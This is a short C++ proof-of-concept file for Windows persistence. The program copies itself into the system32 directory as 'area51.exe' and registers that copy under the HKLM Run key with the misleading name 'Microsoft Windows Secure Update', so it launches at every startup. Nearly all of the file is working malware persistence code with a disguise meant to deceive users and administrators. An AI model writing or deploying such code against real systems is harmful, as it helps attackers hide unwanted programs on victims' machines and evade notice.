/*
PoC to automatically run program on startup
tested at windows 7, windows XP
*/
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <stdio.h>
#include <memory>

// run at 32bit and 64bit
#define KEY_WOW64_32KEY 0x0200
#define KEY_WOW64_64KEY 0x0100
#if defined(_WIN64)
 #define CROSS_ACCESS KEY_WOW64_32KEY
#else
 #define CROSS_ACCESS KEY_WOW64_64KEY
#endif

int main(int argc, char *argv[])
{
// copy program area51.exe to system32 directory
 char system2[MAX_PATH];
 char pathtofile[MAX_PATH];
 HMODULE ModPath = GetModuleHandle(NULL);
 GetModuleFileName(ModPath,pathtofile,sizeof(pathtofile));
 GetSystemDirectory(system2,sizeof(system2));
 strcat(system2,"\\area51.exe"); // your program name at second argv, use strlcat() ;-)
 CopyFile(pathtofile,system2,false);

// write registry entries
 HKEY hKey;
 RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE | CROSS_ACCESS,&hKey );
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms724923%28v=vs.85%29.aspx
 RegSetValueEx(hKey, "Microsoft Windows Secure Update",0,REG_SZ,(const unsigned char*)system2,sizeof(system2));
 RegCloseKey(hKey);

// just another test
 std::cout << "l333t";
 setvbuf(stdout, NULL, _IOLBF, 0);
 system("PAUSE");
 return EXIT_SUCCESS;
}
